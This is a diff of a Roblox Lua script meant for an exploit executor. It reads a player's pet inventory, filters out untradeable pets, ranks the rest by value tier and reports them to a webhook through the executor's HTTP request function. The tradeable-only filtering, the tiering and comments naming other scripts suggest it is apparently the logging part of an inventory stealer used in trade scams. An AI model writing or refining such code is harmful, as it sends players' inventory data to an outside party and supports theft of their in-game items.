@@ -13,24 +13,13 @@ local LOW_THRESHOLD = 300
 local HIGH_THRESHOLD = 1500
 
 -- =========================
--- 🌐 REQUEST DETECTION (DELTA PROXY STYLE)
+-- 🌐 REQUEST DETECTION
 -- =========================
 local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
 
 if not requestFunc then
     warn("❌ No request function")
     return
-end
-
--- =========================
--- 🧠 NORMALIZE NAME (CLEAN - NO YEARS)
--- =========================
-local function normalize(str)
-    str = tostring(str or ""):lower()
-    str = str:gsub("_"," ")
-    str = str:gsub("[^%w%s]","") -- Removes numbers/years
-    str = str:gsub("%s+"," ")
-    return str
 end
 
 -- =========================
@@ -47,77 +36,69 @@ local rarityColors = {
 -- =========================
 -- 🏷️ EMOJIS
 -- =========================
-local function getPetEmoji(name, p)
+local function getPetEmoji(name)
     local e = ""
     if name:find("red fox") then e = "🧑‍🌾 " 
     elseif name:find("disco bee") then e = "🪩 "
     elseif name:find("queen bee") then e = "🐝 " 
     end
-
-    if p.mega then e = e .. "🌈 " elseif p.neon then e = e .. "🟣 " end
-    if p.fly then e = e .. "🪽 " end
-    if p.ride then e = e .. "🏇 " end
-    
     if e == "" then e = "🐾 " end
     return e
 end
 
 -- =========================
--- 📦 PROCESS PETS (SKIP NON-TRADEABLE)
+-- 📦 PROCESS PETS (CLEAN + TRADEABLE ONLY)
 -- =========================
 local function process(pets)
     local map, total = {}, 0
 
     for unique_id, pet_data in pairs(pets or {}) do
         if pet_data and pet_data.id then
-            -- Skip non-tradeable pets (Elysium style)
             local petId = tostring(pet_data.id)
-            if petId:find("starter") or petId:find("practice") or petId:find("jiggly jerboa") then
+            
+            -- SKIP UNTRADEABLE (EXACT MATCHES)
+            if petId:find("starter") or 
+               petId:find("practice") or 
+               petId:find("jiggly jerboa") then
                 continue
             end
             
-            local rawName = petId:gsub("_", " ")
-            local key = normalize(rawName)
+            -- CLEAN NAME (REMOVE YEARS/NUMBERS)
+            local cleanName = petId:gsub("_", " "):gsub("%d", ""):gsub("%s+", " ")
+            local displayName = cleanName:sub(1,1):upper() .. cleanName:sub(2):gsub("^%s*(.-)%s*$", "%1")
 
-            if not map[key] then
-                map[key] = {
-                    name = rawName:sub(1,1):upper() .. rawName:sub(2),
+            if not map[displayName] then
+                map[displayName] = {
+                    name = displayName,
                     count = 0,
-                    value = 0,
-                    rarity = (pet_data.rarity or "common"):lower(),
-                    neon = pet_data.neon,
-                    mega = pet_data.mega,
-                    fly = pet_data.flyable,
-                    ride = pet_data.rideable
+                    rarity = (pet_data.rarity or "common"):lower()
                 }
             end
 
-            map[key].count += 1
+            map[displayName].count += 1
             total += 10 
         end
     end
 
     local list = {}
-    for _, v in pairs(map) do 
-        table.insert(list, v) 
+    for name, v in pairs(map) do 
+        table.insert(list, {name = name, count = v.count, rarity = v.rarity}) 
     end
     
-    -- Sort by count DESC (most valuable/most common first)
-    table.sort(list, function(a,b) 
-        return a.count > b.count 
-    end)
+    -- BEST TO WORST (MOST COUNT FIRST)
+    table.sort(list, function(a,b) return a.count > b.count end)
 
     return list, total
 end
 
 -- =========================
--- 📋 FORMAT (SUPER CLEAN)
+-- 📋 FORMAT (ULTRA CLEAN)
 -- =========================
 local function format(list)
     local t = {}
     for i, p in ipairs(list) do
         if i > 12 then break end
-        table.insert(t, string.format("%s%s x%d", getPetEmoji(p.name:lower(), p), p.name, p.count))
+        table.insert(t, getPetEmoji(p.name:lower()) .. p.name .. " x" .. p.count)
     end
     return (#t > 0 and table.concat(t,"\n") or "No tradeable pets")
 end
@@ -132,7 +113,7 @@ local function getTier(v)
 end
 
 -- =========================
--- 🚀 RUN (DELTA PROXY STYLE)
+-- 🚀 RUN
 -- =========================
 local function Run(data)
     local list, total = process(data.pets)
@@ -172,14 +153,14 @@ local function Run(data)
     end)
 
     if success then
-        print("✅ Webhook Sent Successfully!")
+        print("✅ Webhook Sent!")
     else
-        warn("❌ Webhook Error: " .. tostring(response))
+        warn("❌ Error: " .. tostring(response))
     end
 end
 
 -- =========================
--- 🛠️ FETCH REAL PETS
+-- EXECUTE
 -- =========================
 local inventory = ClientData.get("inventory")
 local pets = inventory and inventory.pets or {}
